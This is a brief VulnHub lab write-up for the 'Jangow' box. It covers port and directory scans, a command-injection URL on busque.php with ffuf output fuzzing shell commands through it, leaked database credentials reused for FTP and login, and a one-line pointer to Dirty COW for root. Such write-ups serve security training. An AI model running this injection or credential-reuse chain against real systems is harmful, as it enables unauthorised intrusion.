# Jangow

Author: Vulnhub
Difficulty: 1
Tags: FTP, LFI, command injection
Type: Linux

# Enumeration

- portscan

```bash
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
80/tcp open  tcpwrapped
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-06-10 18:05  site/
|_
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Index of /
Service Info: OS: Unix
```

- dirscan

```xml
301        9l       28w      305c http://10.0.2.17/site                                                                                                                                                                                  
301        9l       28w      312c http://10.0.2.17/site/assets                                                                                                                                                                           
301        9l       28w      309c http://10.0.2.17/site/css                                                                                                                                                                              
301        9l       28w      315c http://10.0.2.17/site/wordpress                                                                                                                                                                        
200      173l      663w    10190c http://10.0.2.17/site/wordpress/index.html                                                                                                                                                             
301        9l       28w      308c http://10.0.2.17/site/js                                                          
301        9l       28w      316c http://10.0.2.17/site/assets/img
[####################] - 3m   6175260/6175260 0s      found:7       errors:1449608
[####################] - 2m    882180/882180  5612/s  http://10.0.2.17
[####################] - 2m    882180/882180  5582/s  http://10.0.2.17/site
[####################] - 2m    882180/882180  5607/s  http://10.0.2.17/site/assets
[####################] - 3m    882180/882180  4760/s  http://10.0.2.17/site/css
[####################] - 3m    882180/882180  4529/s  http://10.0.2.17/site/wordpress
[####################] - 2m    882180/882180  5420/s  http://10.0.2.17/site/js    
[####################] - 3m    882180/882180  4859/s  http://10.0.2.17/site/assets/img
```

- ftp doesn’t allow anonymous login
- found command execution

```xml
http://jangow/site/busque.php?buscar=whoami
```

```xml
kali@kali  ~/vulnhub/jangow/images  ffuf -u "http://jangow/site/busque.php?buscar=FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 1                                                                         
                                                                                                                                                                                                                                         
        /'___\  /'___\           /'___\                                                                                                                                                                                                  
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                                                                                  
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                                                                                 
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                                                                                 
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                                                                                  
          \/_/    \/_/   \/___/    \/_/                                                                                                                                                                                                  
                                                                                                                                                                                                                                         
       v1.3.1 Kali Exclusive <3                                                                                                                                                                                                          
________________________________________________                                                                                                                                                                                         
                                                                                                                                                                                                                                         
 :: Method           : GET                                                                                                                                                                                                               
 :: URL              : http://jangow/site/busque.php?buscar=FUZZ                                                                                                                                                                         
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                                                                
 :: Follow redirects : false                                                                                                                                                                                                             
 :: Calibration      : false                                                                                                                                                                                                             
 :: Timeout          : 10                                                                                                                                                                                                                
 :: Threads          : 40                                                                                                                                                                                                                
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 1
________________________________________________

info                    [Status: 200, Size: 11087, Words: 2868, Lines: 187]
dir                     [Status: 200, Size: 51, Words: 9, Lines: 3]
free                    [Status: 200, Size: 205, Words: 104, Lines: 5]
groups                  [Status: 200, Size: 10, Words: 1, Lines: 3]
id                      [Status: 200, Size: 55, Words: 3, Lines: 3]
w                       [Status: 200, Size: 131, Words: 48, Lines: 4]
ss                      [Status: 200, Size: 7701, Words: 4186, Lines: 76]
pic                     [Status: 200, Size: 41, Words: 9, Lines: 5]
line                    [Status: 200, Size: 2, Words: 1, Lines: 3]
find                    [Status: 200, Size: 314, Words: 1, Lines: 20]
date                    [Status: 200, Size: 31, Words: 6, Lines: 3]
view                    [Status: 200, Size: 2605, Words: 1826, Lines: 5]
export                  [Status: 200, Size: 372, Words: 10, Lines: 11]
screen                  [Status: 200, Size: 35, Words: 6, Lines: 3]
ps                      [Status: 200, Size: 1629, Words: 588, Lines: 55]
od                      [Status: 200, Size: 9, Words: 1, Lines: 3]
whatis                  [Status: 200, Size: 14, Words: 2, Lines: 3]
script                  [Status: 200, Size: 72, Words: 10, Lines: 5]
arch                    [Status: 200, Size: 8, Words: 1, Lines: 3]
last                    [Status: 200, Size: 3690, Words: 1161, Lines: 54]
vi                      [Status: 200, Size: 2605, Words: 1822, Lines: 5]
set                     [Status: 200, Size: 369, Words: 5, Lines: 18]
ls                      [Status: 200, Size: 58, Words: 1, Lines: 9]
```

- Found a file under /var/www/html/.backup

```bash
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
```

- used these creds to log into ftp
- grabbed files from /var/www/html/
- Found another config file under /var/www/html/site/wordpress

```php
# config.php 
kali@kali  ~/vulnhub/jangow  cat config.php
<?php
$servername = "localhost";
$database = "desafio02";
$username = "desafio02";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
?>
```

# Initial Access

- use these creds to login to the victim VM
- the system is vulnerable to dirtycow exploit use a simple dirtycow exploit to gain root

# Privilege Escalation

# Notes

-